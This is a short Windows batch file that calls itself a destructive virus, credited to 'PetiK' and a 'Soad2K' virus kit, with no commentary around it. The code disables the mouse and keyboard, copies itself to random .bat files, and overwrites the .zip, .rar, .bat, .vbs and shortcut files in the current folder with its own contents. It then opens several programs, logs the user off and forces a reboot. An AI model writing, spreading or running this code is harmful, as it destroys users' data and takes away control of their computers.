   @echo on
   Echo PetiK is watching you !!!
   Echo Hello
   Echo EMM by PetiK
   Echo Bye, bye, bye !!!
   Echo Coucou
   rem This is a Soad2K production virus.
   rem Created with destrutive batch v1.1

   rem 'EMM
   cls
   c:\windows\rundll32 mouse,disable
   c:\windows\rundll32 keyboard,disable

   copy %0 C:\%random%.bat
   copy %0 C:\%random%.bat
   copy %0 C:\%random%.bat
   For %%a In (*.Ink) DO copy %0 %%a
   For %%a In (*.zip) DO copy %0 %%a
   For %%a In (*.Bat) DO copy %0 %%a
   For %%a In (*.Rar) Do copy %0 %%a
   For %%a In (*.Vbs) DO copy %0 %%a

   md C:\%random%


   start notepad
   start command
   start mspaint
   start notepad
   start command
   start mspaint
   RUNDLL32 SHELL32.DLL,SHExitWindowsEx 1.
   shutdown -r -t 10
